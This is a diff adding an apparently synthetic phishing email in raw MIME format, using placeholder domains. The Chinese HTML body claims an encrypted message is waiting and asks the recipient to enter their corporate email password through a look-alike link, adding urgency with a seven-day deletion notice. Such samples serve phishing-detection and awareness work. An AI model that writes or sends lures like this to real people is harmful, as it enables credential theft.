@@ -1,0 +1,10 @@
+From: =?utf-8?B?5L+d5a+G6YKu5Lu2?= <secure@encrypt-mail.example>
+To: legal@corp.internal
+Date: Mon, 07 Sep 2026 09:18:00 +0800
+Message-ID: <0008-b15@synth.example>
+Subject: 您收到一封加密邮件（1 封）
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+
+<html><body><p>外部发来一封加密邮件，使用您的 <b>企业邮箱密码</b> 解密阅读：</p><p><a href='https://enc-mail-read.example.info/open' style='background:#333;color:#fff;padding:10px 26px;text-decoration:none'>🔐 阅读加密邮件</a></p><p style='font-size:12px'>邮件将在 7 天后销毁。</p></body></html>
